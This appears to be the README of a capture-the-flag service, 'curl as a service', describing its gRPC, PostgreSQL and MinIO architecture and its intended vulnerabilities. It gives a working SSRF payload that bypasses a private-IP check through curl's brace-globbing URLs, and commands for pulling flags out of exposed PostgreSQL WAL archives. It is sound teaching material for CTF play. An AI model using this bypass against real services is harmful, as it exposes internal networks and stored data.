# CAAS

## Description

CAAS (curl as a service) service is a grpc service written in python. It allows clients to create profiles, enqueue curl's tasks and fetch results from the service. Workers are polling for tasks with URL info and do a GET request via `curl`. Curl's results are stored in MinIO S3 server. PostgreSQL is used as a database and job queue server.

## Architecture

```
        .------------.              .---------------.
        |            |              |               |
        |   client   |-----gRPC---->|  application  |
        |            |              |               |
        '------------'              '---------------'
                                         |  |
                                         |  |
  .-----------------------.              |  |        .-----------.
  |                       |              |  |        |           |
  |  PostgreSQL           |<---enqueue---'  '--get-->| MinIO S3  |
  |                       |                          |           |
  |                       |                          |           |
  |                       |                          |           |
  |                       |-----------WALs---------->| buckets:  |
  |  archive_mode = on    |                          | curl/     |
  |  archive_timeout = 60 |                          | wal/      |
  |                       |                          |           |
  |                       |<-dequeue--.     .--put-->|           |
  |                       |           |     |        |           |
  '-----------------------'           |     |        '-----------'
                                      |     |
                                      |     |
                                      |     |
                               .---------------.             .-,(  ),-.
                             .---------------. |          .-(          )-.
                             |               | |-------> (    internet    )
                             | cURL executor | |          '-(          ).-'
                             |               |-'              '-.( ).-'
                             '---------------'
```

## Flags

Flags are stored in table `users` in a JSON field `comment` at `profile` column.

## Vulns

There are several bugs in this service:

1. Non strict validation for incoming URL in this code:

```
host = urlparse(request.url).hostname
ip = ipaddress.IPv4Address(host)
if ip.is_private:
    raise Exception("Invalid host")
```

You can pass several hosts in URL in a special braces notation like this: `http://{@host1#,host2}/`.

Python gets only the first hostname and you can bypass `ip.is_private` check.
```
>>> urlparse("http://{@host1#,host2}/").hostname
'host1'
>>>
```

But `curl` will do requests for all hosts in this URL:

```
$ curl http://{@apple.com#,google.com}/
<HTML>
<HEAD>
<TITLE>Document Has Moved</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Document Has Moved</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: The document you requested has moved to a new location.  The new location is "https://www.apple.com/".
</B></FONT>
<HR>
</BODY>
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="http://www.google.com/">here</A>.
</BODY></HTML>
```

So, for now, you can make any GET requests in the docker network.

2. There is a public bucket `wal` where PostgreSQL archives WAL files.

If passing URL to service like this `http://{0@1.1.1.1#,s3:9000}/wal/000000010000000000000007.gz`, you can grab WAL file `000000010000000000000007.gz` which contains a flag, as well as all other data changes in PostgreSQL. The next step is to get a flag from WAL file, the simplest way might look like this:

```
$ gunzip -c 000000010000000000000007.gz | strings -n32 | grep -P -o '\w{31}='
841WOR1PRTHNB4O5E6IY874A7E8558B=
```

List of all WAL files you can get via URL `http://s3:9000/wal`.
